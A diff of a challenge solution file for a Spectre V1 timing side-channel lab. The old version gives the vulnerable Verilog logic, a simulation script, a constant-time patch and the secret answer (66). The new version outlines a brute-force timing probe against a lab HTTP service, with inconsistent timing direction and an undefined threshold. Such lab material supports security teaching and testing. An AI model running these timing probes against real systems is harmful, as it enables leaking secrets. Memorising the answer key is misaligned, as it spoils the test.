@@ -1,46 +1,29 @@
-# Task 002: Spectre V1 (L4: Complete Solution)
+# Task 002: Spectre V1 Side-Channel Attack - Level 4
 
-## Vulnerability
+## Objective
+Exploit a Spectre V1 vulnerability in Verilog RTL to leak a secret value.
 
-In `spectre_v1.v`:
-- When attacker_idx == secret_idx: +1 per cycle (FAST)
-- When attacker_idx != secret_idx: +10 per cycle (SLOW)
+## Hint Level: 4 (Complete)
 
-Timing difference encodes the secret.
+You have access to an HTTP service running on `target:8000`.
 
-## Exploitation
+## Solution Outline
+1. Iterate through possible index values (0-255)
+2. For each index, POST to /measure: {"index": value}
+3. Measure the timing response
+4. Higher timing indicates correct value
+5. Use timing differences to determine the secret
 
-```bash
-cd assets/
-iverilog -o spectre_v1_sim spectre_v1.v testbench.v
-./spectre_v1_sim
-```
-
-Parse output for MATCH line showing secret index (66).
-
-## Automated Exploit
-
+## Example
 ```python
-import subprocess, re
-result = subprocess.run(['./assets/spectre_v1_sim'], capture_output=True, text=True)
-for line in result.stdout.split('\n'):
-    if 'MATCH' in line:
-        match = re.search(r'attacker_idx=\s*(\d+)', line)
-        if match:
-            print(f"Secret: {int(match.group(1))}")
+import requests
+
+for index in range(256):
+    response = requests.post(
+        'http://target:8000/measure',
+        json={"index": index}
+    )
+    timing = response.json()['timing']
+    if timing > threshold:
+        print(f"Secret value: {index}")
 ```
-
-## Patching
-
-Replace if-else with constant timing:
-
-```verilog
-// Always increment by same amount
-spec_timer <= spec_timer + 5;
-```
-
-Synthesis and verify: no timing leak remains.
-
-## Success
-
-Secret recovered: 0x42 (66)
